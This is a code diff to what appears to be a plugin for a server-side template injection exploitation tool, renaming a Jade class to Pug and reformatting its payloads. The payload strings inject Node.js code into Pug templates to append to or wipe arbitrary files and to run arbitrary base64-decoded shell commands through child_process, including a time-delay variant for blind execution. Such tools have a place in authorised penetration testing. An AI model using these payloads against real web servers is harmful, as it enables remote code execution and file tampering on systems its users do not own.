@@ -5,8 +5,7 @@ from utils import rand
 import base64
 import re
 
-
-class Jade(javascript.Javascript):
+class Pug(javascript.Javascript):
     
     def init(self):
 
@@ -21,8 +20,10 @@ class Jade(javascript.Javascript):
             'write' : {
                 'call' : 'inject',
                 # Payloads calling inject must start with \n to break out already started lines
-                'write' : """\n- global.process.mainModule.require('fs').appendFileSync('%(path)s', Buffer('%(chunk_b64)s', 'base64'), 'binary')""",
-                'truncate' : """\n- global.process.mainModule.require('fs').writeFileSync('%(path)s', '')"""
+                'write' : """\n- global.process.mainModule.require('fs').appendFileSync('%(path)s', Buffer('%(chunk_b64)s', 'base64'), 'binary')
+""",
+                'truncate' : """\n- global.process.mainModule.require('fs').writeFileSync('%(path)s', '')
+"""
             },
             'read' : {
                 'call': 'render',
@@ -48,7 +49,8 @@ class Jade(javascript.Javascript):
                 # It's two lines command to avoid false positive with Javascript module
                 'execute_blind': """
 - x = global.process.mainModule.require
-- x('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString() + ' && sleep %(delay)i')//"""
+- x('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString() + ' && sleep %(delay)i')
+"""
             },
             'execute' : {
                 'call': 'render',
